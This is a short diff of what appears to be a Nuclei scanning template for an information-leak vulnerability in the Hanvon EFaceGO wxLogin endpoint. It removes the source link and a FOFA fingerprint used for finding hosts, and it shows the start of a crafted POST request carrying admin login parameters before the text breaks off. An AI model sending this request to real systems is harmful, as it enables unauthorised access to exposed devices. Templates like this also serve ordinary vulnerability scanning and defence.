@@ -3,12 +3,8 @@ info:
   name: 汉王EFaceGO wxLogin存在信息泄露漏洞
   author: hacktwo
   severity: medium
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/neggd8v5ru9vgdo7'
+  description: ''
   tags: info-leak,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: neggd8v5ru9vgdo7
-    fofa: icon_hash="1380907357"
 http:
 - raw:
   - 'POST /manage/m/wxLogin.do?openid=1&username=admin&password=1&id=1&flag=1 HTTP/1.1
